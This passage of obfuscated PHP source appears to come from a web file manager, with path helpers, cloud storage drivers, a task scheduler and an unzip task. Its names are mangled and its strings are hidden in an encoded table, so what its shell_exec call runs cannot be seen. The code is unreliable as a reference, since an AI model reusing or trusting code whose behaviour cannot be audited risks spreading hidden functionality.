$á×È†Õó); foreach ($¹°¼•Çª as $—áˆ•ÜÎ => $ÄÇƒ) { if ($ÄÇƒ !== $Òğâ¿ËÁ[1373]) { continue; } for ($öÇ€œÙ§ = $—áˆ•ÜÎ; $öÇ€œÙ§ >= 0; $öÇ€œÙ§--) { if ($¹°¼•Çª[$öÇ€œÙ§] === $Òğâ¿ËÁ[10] || $¹°¼•Çª[$öÇ€œÙ§] === $Òğâ¿ËÁ[1373] || $¹°¼•Çª[$öÇ€œÙ§] === -1) { continue; } if ($¹°¼•Çª[$öÇ€œÙ§] === $Òğâ¿ËÁ[12]) { $¹°¼•Çª[$—áˆ•ÜÎ] = -1; break; } $¹°¼•Çª[$—áˆ•ÜÎ] = -1; $¹°¼•Çª[$öÇ€œÙ§] = -1; break; } } $ã¿©Ìè = array(); foreach ($¹°¼•Çª as $ÄÇƒ) { if ($ÄÇƒ !== -1) { $ã¿©Ìè[] = $ÄÇƒ; } } $àòÈ“±è = implode($Òğâ¿ËÁ[8], $ã¿©Ìè); if (strpos($àòÈ“±è, $Òğâ¿ËÁ[1374]) === 0) { $àòÈ“±è = $Òğâ¿ËÁ[1370] . substr($àòÈ“±è, strlen($Òğâ¿ËÁ[1374])); } return $àòÈ“±è; } public static function pathUrlClear($íÃ†ú“) { $ôó¼îªŞ =& $_SERVER[²Ö÷öõ]; if (!$íÃ†ú“) { return $íÃ†ú“; } $íÃ†ú“ = rawurldecode($íÃ†ú“); $íÃ†ú“ = str_replace($ôó¼îªŞ[1372], $ôó¼îªŞ[8], $íÃ†ú“); if (strpos($íÃ†ú“, $ôó¼îªŞ[76]) > 0) { $íÃ†ú“ = substr($íÃ†ú“, 0, strpos($íÃ†ú“, $ôó¼îªŞ[76])); } if (strpos($íÃ†ú“, $ôó¼îªŞ[1375]) > 0) { $íÃ†ú“ = substr($íÃ†ú“, 0, strpos($íÃ†ú“, $ôó¼îªŞ[1375])); } return $íÃ†ú“; } public static function sourceID($¬¡Ù—¦œ) { $±“à”¬‰ =& $_SERVER[²Ö÷öõ]; $ì÷ìÇ’Å = self::parse($¬¡Ù—¦œ); if ($ì÷ìÇ’Å[$±“à”¬‰[33]] !== self::KOD_SOURCE) { show_json(LNG($±“à”¬‰[1376]), !1); } return $ì÷ìÇ’Å[$±“à”¬‰[475]]; } public static function make($Ïü¾…ô) { if (!$Ïü¾…ô) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ïü¾…ô)); } public static function makeShare($ó¡‹‰ö, $ªŠ‡êš) { return self::makePath(self::KOD_SHARE_ITEM, $ó¡‹‰ö, $ªŠ‡êš); } public static function makeFileTypePath($‹é·şÏ­) { return self::makePath(self::KOD_USER_FILE_TYPE, $‹é·şÏ­); } public static function makeFileTagPath($ÊĞëø‘¯) { return self::makePath(self::KOD_USER_FILE_TAG, $ÊĞëø‘¯); } public static function makePath($Ø²ü²ø–, $É¿¸Ç’¥ = '', $™º¥ì¾µ = '') { $®şøıòç =& $_SERVER[²Ö÷öõ]; $…ù Ï±Å = substr($Ø²ü²ø–, 1, -1); $ÒßµÄÇÛ = $®şøıòç[1377] . $…ù Ï±Å . $®şøıòç[1378] . $É¿¸Ç’¥ . $®şøıòç[1379]; $ÒßµÄÇÛ = $™º¥ì¾µ ? $ÒßµÄÇÛ . $™º¥ì¾µ . $®şøıòç[8] : $ÒßµÄÇÛ; return $ÒßµÄÇÛ; } public static function hashPath($æ…ñ« ÷, $ÉÁÛÓÅù = true) { $½ˆÆ˜ú =& $_SERVER[²Ö÷öõ]; $ú¡ŒÍ•« = is_array($æ…ñ« ÷) ? $æ…ñ« ÷ : IO::info($æ…ñ« ÷); $îİ¾´é = _get($ú¡ŒÍ•«, $½ˆÆ˜ú[1380], $½ˆÆ˜ú[12]); if (!$îİ¾´é && isset($ú¡ŒÍ•«[$½ˆÆ˜ú[235]])) { $îİ¾´é = trim($ú¡ŒÍ•«[$½ˆÆ˜ú[235]], $½ˆÆ˜ú[121]); } if (!$îİ¾´é && isset($ú¡ŒÍ•«[$½ˆÆ˜ú[193]]) && $ú¡ŒÍ•«[$½ˆÆ˜ú[193]]) { $ú¡ŒÍ•« = IO::info(KodIO::make($ú¡ŒÍ•«[$½ˆÆ˜ú[193]])); $îİ¾´é = _get($ú¡ŒÍ•«, $½ˆÆ˜ú[1380], $½ˆÆ˜ú[12]); } $Î§š†šÇ = md5($ú¡ŒÍ•«[$½ˆÆ˜ú[87]] . $ú¡ŒÍ•«[$½ˆÆ˜ú[79]] . $ú¡ŒÍ•«[$½ˆÆ˜ú[88]]); if (!$îİ¾´é && file_exists($ú¡ŒÍ•«[$½ˆÆ˜ú[87]])) { $îİ¾´é = Cache::get($Î§š†šÇ . $½ˆÆ˜ú[1381]); $îİ¾´é = !1; if (!$îİ¾´é) { $îİ¾´é = IO::hashSimple($ú¡ŒÍ•«[$½ˆÆ˜ú[87]]); Cache::set($Î§š†šÇ . $½ˆÆ˜ú[1381], $îİ¾´é, 3600 * 24 * 30); } } if ($ÉÁÛÓÅù && !$îİ¾´é) { } return $îİ¾´é ? $îİ¾´é : $Î§š†šÇ; } public static function hashPathSafe($´Òˆ½èä, $ú¯•‚¿Ë = true) { $µó™ğ›ß =& $_SERVER[²Ö÷öõ]; $›‡Üş = self::hashPath($´Òˆ½èä, $ú¯•‚¿Ë); return md5($›‡Üş . $µó™ğ›ß[1382] . Model($µó™ğ›ß[853])->get($µó™ğ›ß[854])); } public static function initSystemPath() { $ëı·° œ =& $_SERVER[²Ö÷öõ]; if (defined($ëı·° œ[1383])) { return; } define($ëı·° œ[1383], self::systemPath($ëı·° œ[191])); define($ëı·° œ[1384], self::systemPath($ëı·° œ[1385])); define($ëı·° œ[1386], self::systemPath($ëı·° œ[1387])); define($ëı·° œ[1388], self::systemPath($ëı·° œ[1389])); IOHistory::bindEvent(); } public static function systemPath($İãùÄí†) { $¤æÊ½¸¬ =& $_SERVER[²Ö÷öõ]; $û„ˆ•ÔÉ = $¤æÊ½¸¬[1390] . ucfirst($İãùÄí†); $Ë¾ö²çò = Model($¤æÊ½¸¬[853])->get($û„ˆ•ÔÉ); if ($Ë¾ö²çò) { return $Ë¾ö²çò; } if ($İãùÄí† == $¤æÊ½¸¬[191]) { $Ë¾ö²çò = self::make(Model($¤æÊ½¸¬[907])->systemRootPathAdd($¤æÊ½¸¬[605])); } else { $Ë¾ö²çò = self::systemPath($¤æÊ½¸¬[191]); $ü¥ö÷Ö“ = self::sourceID($Ë¾ö²çò); $Ë¾ö²çò = self::make(Model($¤æÊ½¸¬[907])->mkdir($ü¥ö÷Ö“, $İãùÄí†)); } Model($¤æÊ½¸¬[853])->set($û„ˆ•ÔÉ, $Ë¾ö²çò); return $Ë¾ö²çò; } public static function systemFolder($àºïîæ») { $½º¢Ù‰Î = IO_PATH_SYSTEM_SOURCE . $àºïîæ»; $ÄÛÂìº« = Cache::get($½º¢Ù‰Î); if (!$ÄÛÂìº«) { $õ®İøÒÚ = IO::infoFullSimple($½º¢Ù‰Î); if (!$õ®İøÒÚ) { $ÄÛÂìº« = IO::mkdir($½º¢Ù‰Î, REPEAT_SKIP); } else { $ÄÛÂìº« = $õ®İøÒÚ[$_SERVER[²Ö÷öõ][87]]; } Cache::set($½º¢Ù‰Î, $ÄÛÂìº«, 3600 * 10); } return $ÄÛÂìº«; } public static function defaultDriver() { return Model($_SERVER[²Ö÷öõ][850])->defaultDriver(); } public static function defaultIO() { $ş¡‰–­Õ =& $_SERVER[²Ö÷öõ]; $¹é§º¹ = self::defaultDriver(); return $ş¡‰–­Õ[1391] . $¹é§º¹[$ş¡‰–­Õ[475]] . $ş¡‰–­Õ[1379]; } public static function defaultDriverInit() { static $ºÓ½Äº = false; if ($ºÓ½Äº) { return $ºÓ½Äº; } $ºÓ½Äº = IO::init(self::defaultIO()); return $ºÓ½Äº; } public static function fileTypeList() { $Ã¨É»ô¶ =& $_SERVER[²Ö÷öõ]; $µ¤¡Î¶ñ = $GLOBALS[$Ã¨É»ô¶[6]][$Ã¨É»ô¶[1392]]; foreach ($µ¤¡Î¶ñ as $§ëÕÎ„‚ => $öÍı¤åˆ) { $áä€†â² = $Ã¨É»ô¶[1393] . $§ëÕÎ„‚; $öÜÎß‰« = LNG($áä€†â²); if ($áä€†â² != $öÜÎß‰«) { $µ¤¡Î¶ñ[$§ëÕÎ„‚][$Ã¨É»ô¶[32]] = $öÜÎß‰«; } } return $µ¤¡Î¶ñ; } public static function diskList($±–£Ç— = true) { $øÇæ¶¢ø = $_SERVER[²Ö÷öõ][1394]; if ($±–£Ç—) { $†ƒØòî’ = Cache::get($øÇæ¶¢ø); if (is_array($†ƒØòî’)) { return $†ƒØòî’; } } $†ƒØòî’ = self::diskListGet(); Cache::set($øÇæ¶¢ø, $†ƒØòî’, 60); return $†ƒØòî’; } public static function diskListGet() { $·äõøºÃ =& $_SERVER[²Ö÷öõ]; $Âßœï®‹ = array(); if ($GLOBALS[$·äõøºÃ[6]][$·äõøºÃ[1395]] == $·äõøºÃ[1396]) { $”§Õºƒ˜ = $·äõøºÃ[1397]; for ($ëßÉø´ï = 0; $ëßÉø´ï < strlen($”§Õºƒ˜); $ëßÉø´ï++) { $ ğ™­ ª = $”§Õºƒ˜[$ëßÉø´ï] . $·äõøºÃ[1398]; if (file_exists($ ğ™­ ª)) { $Âßœï®‹[] = $ ğ™­ ª; } } return $Âßœï®‹; } if (!function_exists($·äõøºÃ[101])) { $Âßœï®‹[] = $·äõøºÃ[918]; return $Âßœï®‹; } $€´¸ş· = explode($·äõøºÃ[262], shell_exec($·äõøºÃ[1399])); array_shift($€´¸ş·); array_pop($€´¸ş·); $ä¤Ìù¡ù = array($·äõøºÃ[1400], $·äõøºÃ[1401], $·äõøºÃ[1402], $·äõøºÃ[1403], $·äõøºÃ[1404], $·äõøºÃ[1405], $·äõøºÃ[1406], $·äõøºÃ[1407]); foreach ($€´¸ş· as $ÜÛâèù·) { $ïœ´‹Ôí = preg_split($·äõøºÃ[1408], $ÜÛâèù·); $ ğ™­ ª = $ïœ´‹Ôí[count($ïœ´‹Ôí) - 1]; if (!strstr($ïœ´‹Ôí[0], $·äõøºÃ[1409]) || !$ ğ™­ ª) { continue; } $»¥à™²“ = rtrim($ ğ™­ ª, $·äõøºÃ[8]) . $·äõøºÃ[8]; if (in_array($»¥à™²“, $ä¤Ìù¡ù)) { continue; } $Âßœï®‹[] = $»¥à™²“; } return $Âßœï®‹; } public static function isSameDisk($È›¢Ä¥, $¾áÃÂ©§) { $«È³æšÇ =& $_SERVER[²Ö÷öõ]; if ($GLOBALS[$«È³æšÇ[6]][$«È³æšÇ[1395]] == $«È³æšÇ[1396]) { return strtolower(substr($È›¢Ä¥, 0, 1)) == strtolower(substr($¾áÃÂ©§, 0, 1)); } $Ğèûœâ‚ = self::diskList(); $—ªç¦‰‡ = !1; $´éıõÜ = !1; sort($Ğèûœâ‚); $Ğèûœâ‚ = array_reverse($Ğèûœâ‚); $È›¢Ä¥ = rtrim($È›¢Ä¥, $«È³æšÇ[8]) . $«È³æšÇ[8]; $¾áÃÂ©§ = rtrim($¾áÃÂ©§, $«È³æšÇ[8]) . $«È³æšÇ[8]; foreach ($Ğèûœâ‚ as $•¶­ÁÖµ) { $Ú¸ûø… = strlen($•¶­ÁÖµ); if (!$—ªç¦‰‡ && substr($È›¢Ä¥, 0, $Ú¸ûø…) == $•¶­ÁÖµ) { $—ªç¦‰‡ = $•¶­ÁÖµ; } if (!$´éıõÜ && substr($¾áÃÂ©§, 0, $Ú¸ûø…) == $•¶­ÁÖµ) { $´éıõÜ = $•¶­ÁÖµ; } if ($—ªç¦‰‡ && $´éıõÜ) { break; } } return $—ªç¦‰‡ === $´éıõÜ; } public static function transferType($½»áüªÏ, $Œ–îÏÚ) { $ôÛ¼ë®¸ =& $_SERVER[²Ö÷öõ]; $Š¦¹¤Š = self::driverType($½»áüªÏ); $‘İÙëÍ” = self::driverType($Œ–îÏÚ); if ($Š¦¹¤Š[$ôÛ¼ë®¸[33]] == $‘İÙëÍ”[$ôÛ¼ë®¸[33]] && $Š¦¹¤Š[$ôÛ¼ë®¸[1410]] == $‘İÙëÍ”[$ôÛ¼ë®¸[1410]]) { return $ôÛ¼ë®¸[1411]; } if ($Š¦¹¤Š[$ôÛ¼ë®¸[33]] == $ôÛ¼ë®¸[951] && $‘İÙëÍ”[$ôÛ¼ë®¸[33]] == $ôÛ¼ë®¸[109]) { return $ôÛ¼ë®¸[1287]; } if ($Š¦¹¤Š[$ôÛ¼ë®¸[33]] == $ôÛ¼ë®¸[109] && $‘İÙëÍ”[$ôÛ¼ë®¸[33]] == $ôÛ¼ë®¸[951]) { return $ôÛ¼ë®¸[110]; } return $ôÛ¼ë®¸[1412]; } public static function driverType($ç±ğ·¬ã) { $äà—µœ‘ =& $_SERVER[²Ö÷öõ]; $€åüÚ‘Ê = str_replace($äà—µœ‘[1413], $äà—µœ‘[12], strtolower($ç±ğ·¬ã->getType())); if ($€åüÚ‘Ê == $äà—µœ‘[840] || $€åüÚ‘Ê == $äà—µœ‘[1414] || $€åüÚ‘Ê == $äà—µœ‘[1415]) { $ç±ğ·¬ã = self::defaultDriverInit(); } else { if ($€åüÚ‘Ê == $äà—µœ‘[1297] || $€åüÚ‘Ê == $äà—µœ‘[1416]) { $ç±ğ·¬ã = IO::init($ç±ğ·¬ã->pathParse[$äà—µœ‘[1240]]); } } $èëøÉÌü = $ç±ğ·¬ã->path; $€åüÚ‘Ê = str_replace($äà—µœ‘[1413], $äà—µœ‘[12], strtolower($ç±ğ·¬ã->getType())); if ($€åüÚ‘Ê == $äà—µœ‘[109]) { return array($äà—µœ‘[33] => $äà—µœ‘[109], $äà—µœ‘[1410] => $äà—µœ‘[12], $äà—µœ‘[87] => $èëøÉÌü, $äà—µœ‘[98] => $ç±ğ·¬ã); } return array($äà—µœ‘[33] => $äà—µœ‘[951], $äà—µœ‘[1410] => $ç±ğ·¬ã->pathDriver, $äà—µœ‘[87] => $èëøÉÌü, $äà—µœ‘[98] => $ç±ğ·¬ã); } public static function pathDriverType($êŸºò­ƒ) { return $êŸºò­ƒ ? self::driverType(IO::init($êŸºò­ƒ)) : !1; } public static function pathDriverLocal($ı›‰ª«) { $çô¥õòª =& $_SERVER[²Ö÷öõ]; $ ƒÓÁ‚Š = $ı›‰ª« ? self::driverType(IO::init($ı›‰ª«)) : !1; return strtolower($ ƒÓÁ‚Š[$çô¥õòª[33]]) == $çô¥õòª[109] ? !0 : !1; } public static function allowCover($¾ÔÄÆ©Á, $×Òí¦“Ş = true) { $…öç¨ş« =& $_SERVER[²Ö÷öõ]; if (is_string($¾ÔÄÆ©Á)) { $¾ÔÄÆ©Á = IO::info($¾ÔÄÆ©Á); } if (!$¾ÔÄÆ©Á || $¾ÔÄÆ©Á[$…öç¨ş«[33]] == $…öç¨ş«[78] || $¾ÔÄÆ©Á[$…öç¨ş«[79]] <= 100) { return !1; } if (isset($¾ÔÄÆ©Á[$…öç¨ş«[1417]]) || !$¾ÔÄÆ©Á[$…öç¨ş«[87]]) { return !1; } if (isset($¾ÔÄÆ©Á[$…öç¨ş«[232]]) && !$¾ÔÄÆ©Á[$…öç¨ş«[232]]) { return !1; } static $¹£í¬Èİ = false; if (!$¹£í¬Èİ || !$×Òí¦“Ş) { $”¨èÔ¾ = self::driverType(IO::init($¾ÔÄÆ©Á[$…öç¨ş«[87]])); $å‚ÍÁ°´ = $”¨èÔ¾[$…öç¨ş«[98]]; $¹£í¬Èİ = $…öç¨ş«[196]; if ($”¨èÔ¾[$…öç¨ş«[33]] == $…öç¨ş«[109]) { $¹£í¬Èİ = $…öç¨ş«[1418]; } if ($”¨èÔ¾[$…öç¨ş«[98]] && is_array($”¨èÔ¾[$…öç¨ş«[98]]->config)) { $Ô¥–ãáÓ = $”¨èÔ¾[$…öç¨ş«[98]]->config; if (isset($Ô¥–ãáÓ[$…öç¨ş«[1419]]) && $Ô¥–ãáÓ[$…öç¨ş«[1419]]) { $¹£í¬Èİ = $…öç¨ş«[1418]; } } $à¿Û¿¤Ó = KodIO::defaultDriver(); if (strtolower($à¿Û¿¤Ó[$…öç¨ş«[98]]) == $…öç¨ş«[109] && is_array($à¿Û¿¤Ó[$…öç¨ş«[6]])) { $¨ò°¸ãÒ = $à¿Û¿¤Ó[$…öç¨ş«[6]][$…öç¨ş«[1270]]; if (substr($¨ò°¸ãÒ, 0, 2) == $…öç¨ş«[1420]) { $¨ò°¸ãÒ = str_replace($…öç¨ş«[1420], BASIC_PATH, $¨ò°¸ãÒ); } $¨ò°¸ãÒ = str_replace($…öç¨ş«[592], $…öç¨ş«[8], $¨ò°¸ãÒ); if (substr($¾ÔÄÆ©Á[$…öç¨ş«[87]], 0, strlen($¨ò°¸ãÒ)) == $¨ò°¸ãÒ) { $¹£í¬Èİ = $…öç¨ş«[196]; } } } return $¹£í¬Èİ == $…öç¨ş«[1418] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÄäÄŒ°¼) { parent::__construct($ÄäÄŒ°¼); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($¸öÈíİ“) { $¼‡ì«íÌ =& $_SERVER[²Ö÷öõ]; if (substr($¸öÈíİ“, 0, 7) == $¼‡ì«íÌ[313]) { $¸öÈíİ“ = $¼‡ì«íÌ[314] . substr($¸öÈíİ“, 7); } header($¼‡ì«íÌ[175] . $¸öÈíİ“); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Å«í¶÷¼) { parent::__construct($Å«í¶÷¼); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } public function uploadFormData($ú¤ÜÀÉğ, $İœÒÊ›ê = 3600) { $€ëÎé =& $_SERVER[²Ö÷öõ]; $ú¿™ ËŠ = $€ëÎé[229]; $¯ãÚ×¤É = $€ëÎé[263]; $Ÿº€Ü•² = $€ëÎé[274]; $©—Æ‹ÙÇ = gmdate($€ëÎé[299], time() + $İœÒÊ›ê); $ê¬’Öõ = (string) time() . $€ëÎé[74] . (string) (time() + $İœÒÊ›ê); $Æ¯É’ı» = array($€ëÎé[275] => $©—Æ‹ÙÇ, $€ëÎé[278] => array(array($€ëÎé[280] => $ú¿™ ËŠ), array($€ëÎé[279] => $this->bucket), array($€ëÎé[281], $€ëÎé[282], $€ëÎé[12]), array($€ëÎé[285] => $Ÿº€Ü•²), array($€ëÎé[1421] => $¯ãÚ×¤É), array($€ëÎé[1422] => $this->accessKey), array($€ëÎé[1423] => $ê¬’Öõ))); $Æ¯É’ı» = json_encode($Æ¯É’ı»); $õÎ‹±ë™ = hash_hmac($€ëÎé[263], $ê¬’Öõ, $this->secret); $·×ˆ½ ¢ = sha1($Æ¯É’ı»); $£ì¥îûÇ = hash_hmac($€ëÎé[263], $·×ˆ½ ¢, $õÎ‹±ë™); $ìàª²ú = array($€ëÎé[280] => $ú¿™ ËŠ, $€ëÎé[285] => $Ÿº€Ü•², $€ëÎé[293] => base64_encode($Æ¯É’ı»), $€ëÎé[1421] => $¯ãÚ×¤É, $€ëÎé[1422] => $this->accessKey, $€ëÎé[1424] => $ê¬’Öõ, $€ëÎé[1425] => $£ì¥îûÇ, $€ëÎé[208] => $this->getHost()); return $ìàª²ú; } public function fileOutImage($ÉïÉÊ³İ, $¥ÈÏÁşà = 250) { $±•œªúª =& $_SERVER[²Ö÷öõ]; if ($this->size($ÉïÉÊ³İ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÉïÉÊ³İ, $¥ÈÏÁşà); } $–’”Îàä = $this->link($ÉïÉÊ³İ); $–’”Îàä .= $±•œªúª[1426] . $¥ÈÏÁşà . $±•œªúª[1427]; $this->fileOutLink($–’”Îàä); } public function fileOutLink($›èüİöñ) { $Óíº£©À =& $_SERVER[²Ö÷öõ]; if (substr($›èüİöñ, 0, 7) == $Óíº£©À[313]) { $›èüİöñ = $Óíº£©À[314] . substr($›èüİöñ, 7); } header($Óíº£©À[175] . $›èüİöñ); die; } } goto F®“•›äÛ¹; CÌß«¯Õ“­: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($÷ÁÜ‘Èí, $¡ĞºÎˆº = 5.0) { if (!$÷ÁÜ‘Èí) { return; } $Ş±ô¯Û = Cache::get($÷ÁÜ‘Èí); if (!$Ş±ô¯Û || timeFloat() - floatVal($Ş±ô¯Û) >= $¡ĞºÎˆº) { Cache::set($÷ÁÜ‘Èí, timeFloat(), $¡ĞºÎˆº * 10); return !0; } return !1; } public static function timeLimitCall($ºèéûÎ², $ÊæÅš˜Ğ, $ñîçáë, $Ñ‡°˜çÅ = 5.0) { $Ò›ÓÒÏ =& $_SERVER[²Ö÷öõ]; if (!$ºèéûÎ² || !$ÊæÅš˜Ğ) { return; } self::$asyncAdd = !0; $·‚š¢İ— = $Ò›ÓÒÏ[1887]; $ëòåŸ£ş = Cache::get($·‚š¢İ—, !0); $ü·ü±üÊ = array($Ò›ÓÒÏ[1888] => timeFloat(), $Ò›ÓÒÏ[1889] => timeFloat(), $Ò›ÓÒÏ[341] => $ÊæÅš˜Ğ, $Ò›ÓÒÏ[1879] => $ñîçáë, $Ò›ÓÒÏ[206] => $Ñ‡°˜çÅ); if (is_array($ëòåŸ£ş[$ºèéûÎ²])) { $ü·ü±üÊ[$Ò›ÓÒÏ[1889]] = $ëòåŸ£ş[$ºèéûÎ²][$Ò›ÓÒÏ[1889]]; } if (is_array($ëòåŸ£ş[$ºèéûÎ²])) { if (timeFloat() - $ëòåŸ£ş[$ºèéûÎ²][$Ò›ÓÒÏ[1888]] < $ü·ü±üÊ[$Ò›ÓÒÏ[206]] * 0.3) { return; } $ü·ü±üÊ[$Ò›ÓÒÏ[1889]] = $ëòåŸ£ş[$ºèéûÎ²][$Ò›ÓÒÏ[1889]]; } $ëòåŸ£ş[$ºèéûÎ²] = $ü·ü±üÊ; Cache::set($·‚š¢İ—, $ëòåŸ£ş, 60); Cache::removeMemory($·‚š¢İ—); write_log($Ò›ÓÒÏ[1890] . $ºèéûÎ² . $Ò›ÓÒÏ[74] . $ÊæÅš˜Ğ, $Ò›ÓÒÏ[197]); } public static function timeLimitCallLoop() { $Ü…‹”¯ =& $_SERVER[²Ö÷öõ]; $¹‡¹¸Æ‘ = array($Ü…‹”¯[1891]); $±×ñŸ½¡ = in_array(strtolower(ACTION), $¹‡¹¸Æ‘); if (!$±×ñŸ½¡ && !self::$asyncAdd) { return; } $³½šç‘À = $Ü…‹”¯[1887]; $îÀéÔ” = Cache::get($³½šç‘À, !0); if (!$îÀéÔ” || count($îÀéÔ”) <= 0) { return; } $ñ¾šĞê = !1; $¿ãñœ©É = timeFloat(); $›…“¹û = array(); foreach ($îÀéÔ” as $°íµŒ‘… => $–ğÖ¿­¨) { if ($¿ãñœ©É - $–ğÖ¿­¨[$Ü…‹”¯[1889]] > $–ğÖ¿­¨[$Ü…‹”¯[206]]) { $ñ¾šĞê = !0; try { Hook::apply($–ğÖ¿­¨[$Ü…‹”¯[341]], $–ğÖ¿­¨[$Ü…‹”¯[1879]]); write_log($Ü…‹”¯[1892] . $°íµŒ‘… . $Ü…‹”¯[74] . $–ğÖ¿­¨[$Ü…‹”¯[341]] . $Ü…‹”¯[1893] . ACTION, $Ü…‹”¯[197]); } catch (Exception $ÙÌ‘÷é) { } continue; } $›…“¹û[$°íµŒ‘…] = $–ğÖ¿­¨; } if (!$ñ¾šĞê) { return; } if (!$›…“¹û) { return Cache::remove($³½šç‘À); } Cache::set($³½šç‘À, $›…“¹û, 60); Cache::removeMemory($³½šç‘À); } public static function finished($‘¼¾î¬, $ó³Á) { $õúÔÛ =& $_SERVER[²Ö÷öõ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($õúÔÛ[341] => $‘¼¾î¬, $õúÔÛ[1879] => $ó³Á); } private static function finishedRun() { $‚ÉôĞöñ =& $_SERVER[²Ö÷öõ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $‰¸˜ªµ™) { try { Hook::apply($‰¸˜ªµ™[$‚ÉôĞöñ[341]], $‰¸˜ªµ™[$‚ÉôĞöñ[1879]]); } catch (Exception $Â¡ôÃ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $±Ãàñ¢Š =& $_SERVER[²Ö÷öõ]; parent::startAfter(); Hook::bind($±Ãàñ¢Š[1894], array($this, $±Ãàñ¢Š[1895])); Hook::bind($±Ãàñ¢Š[1286], array($this, $±Ãàñ¢Š[1896])); Hook::bind($±Ãàñ¢Š[1897], array($this, $±Ãàñ¢Š[1898])); $•¤½Œİ€ =& $this->task; $•¤½Œİ€[$±Ãàñ¢Š[1899]] = $±Ãàñ¢Š[1287]; if (!$•¤½Œİ€[$±Ãàñ¢Š[1667]]) { $•¤½Œİ€[$±Ãàñ¢Š[1667]] = LNG($±Ãàñ¢Š[1900]); } } protected function endAfter() { $İ®èà¥¬ =& $_SERVER[²Ö÷öõ]; parent::endAfter(); Hook::unbind($İ®èà¥¬[1894], array($this, $İ®èà¥¬[1895])); Hook::unbind($İ®èà¥¬[1286], array($this, $İ®èà¥¬[1896])); Hook::unbind($İ®èà¥¬[1897], array($this, $İ®èà¥¬[1898])); } public function updateAfter() { $€Êı¬‡ =& $_SERVER[²Ö÷öõ]; $¡Àáˆ×¥ =& $this->task; if (!$¡Àáˆ×¥[$€Êı¬‡[1149]] || !$¡Àáˆ×¥[$€Êı¬‡[846]]) { if ($¡Àáˆ×¥[$€Êı¬‡[1899]] != $€Êı¬‡[389]) { return; } } if ($¡Àáˆ×¥[$€Êı¬‡[1899]] == $€Êı¬‡[1287]) { $Ä“Ø„»ˆ = 0; if ($¡Àáˆ×¥[$€Êı¬‡[1834]]) { $Ä“Ø„»ˆ = $¡Àáˆ×¥[$€Êı¬‡[1835]] / $¡Àáˆ×¥[$€Êı¬‡[1834]]; } $¡Àáˆ×¥[$€Êı¬‡[1782]] = $Ä“Ø„»ˆ * 0.3; } else { if ($¡Àáˆ×¥[$€Êı¬‡[1899]] == $€Êı¬‡[389]) { $Ä“Ø„»ˆ = $¡Àáˆ×¥[$€Êı¬‡[1781]] / $¡Àáˆ×¥[$€Êı¬‡[1149]]; $¡Àáˆ×¥[$€Êı¬‡[1782]] = 0.3 + $Ä“Ø„»ˆ * 0.4; } else { if ($¡Àáˆ×¥[$€Êı¬‡[1899]] == $€Êı¬‡[110]) { $õäâ°Ô¯ = 0; if ($¡Àáˆ×¥[$€Êı¬‡[1836]] == $€Êı¬‡[110]) { $õäâ°Ô¯ = $¡Àáˆ×¥[$€Êı¬‡[1835]]; } $Ä“Ø„»ˆ = ($¡Àáˆ×¥[$€Êı¬‡[1839]] + $õäâ°Ô¯) / $¡Àáˆ×¥[$€Êı¬‡[846]]; $¡Àáˆ×¥[$€Êı¬‡[1782]] = 0.3 + 0.4 + $Ä“Ø„»ˆ * 0.3; } } } if ($¡Àáˆ×¥[$€Êı¬‡[1782]] > 0) { $ı¸•¡¤ = timeFloat() - $¡Àáˆ×¥[$€Êı¬‡[1784]] - $¡Àáˆ×¥[$€Êı¬‡[1787]]; $¡Àáˆ×¥[$€Êı¬‡[1788]] = $ı¸•¡¤ * (1 - $¡Àáˆ×¥[$€Êı¬‡[1782]]) / $¡Àáˆ×¥[$€Êı¬‡[1782]]; } } public function addFile($ëöÌÇ¢Õ) { $‡ãé–¾® =& $_SERVER[²Ö÷öõ]; $Ú¤‹ê… =& $this->task; $¦¿††… = IO::info($ëöÌÇ¢Õ); $Ú¤‹ê…[$‡ãé–¾®[1832]] = $¦¿††…[$‡ãé–¾®[32]]; $Ú¤‹ê…[$‡ãé–¾®[1834]] = $¦¿††…[$‡ãé–¾®[79]]; $Ú¤‹ê…[$‡ãé–¾®[1835]] = 0; $Ú¤‹ê…[$‡ãé–¾®[1151]] = $‡ãé–¾®[1855]; $Ú¤‹ê…[$‡ãé–¾®[1836]] = $‡ãé–¾®[1287]; $Ú¤‹ê…[$‡ãé–¾®[846]] = $¦¿††…[$‡ãé–¾®[79]]; $Ú¤‹ê…[$‡ãé–¾®[1149]] = 1; $ûÂ‚®ÆË = 0; $Ú¤‹ê…[$‡ãé–¾®[1843]] = array($‡ãé–¾®[1844] => $ûÂ‚®ÆË + 1, $‡ãé–¾®[494] => $¦¿††…[$‡ãé–¾®[32]], $‡ãé–¾®[87] => $¦¿††…[$‡ãé–¾®[87]], $‡ãé–¾®[582] => $¦¿††…[$‡ãé–¾®[582]] ? $¦¿††…[$‡ãé–¾®[582]] : $¦¿††…[$‡ãé–¾®[87]]); $this->update(); } public function zipEvent($Ö©ê¿ä, $³ÈİÔ‚, $¬­…Ë½, $¼„·ùù¾) { $°Şî°À’ =& $_SERVER[²Ö÷öõ]; $èâ×ŠÃ =& $this->task; $èâ×ŠÃ[$°Şî°À’[1832]] = get_path_this($³ÈİÔ‚); $èâ×ŠÃ[$°Şî°À’[1834]] = $¼„·ùù¾; $èâ×ŠÃ[$°Şî°À’[1835]] = $¬­…Ë½; $èâ×ŠÃ[$°Şî°À’[1151]] = $Ö©ê¿ä == $°Şî°À’[1901] ? $°Şî°À’[1902] : $°Şî°À’[1903]; $èâ×ŠÃ[$°Şî°À’[1836]] = $°Şî°À’[12]; $èâ×ŠÃ[$°Şî°À’[846]] = $¼„·ùù¾; $èâ×ŠÃ[$°Şî°À’[1899]] = $°Şî°À’[389]; $this->update(); } public function unzipAfter($¶€¸úíÙ) { $šóÒ…¤Ÿ =& $_SERVER[²Ö÷öõ]; $Îœ–ç =& $this->task; $Îœ–ç[$šóÒ…¤Ÿ[1899]] = $šóÒ…¤Ÿ[110]; $êß‡»úº = 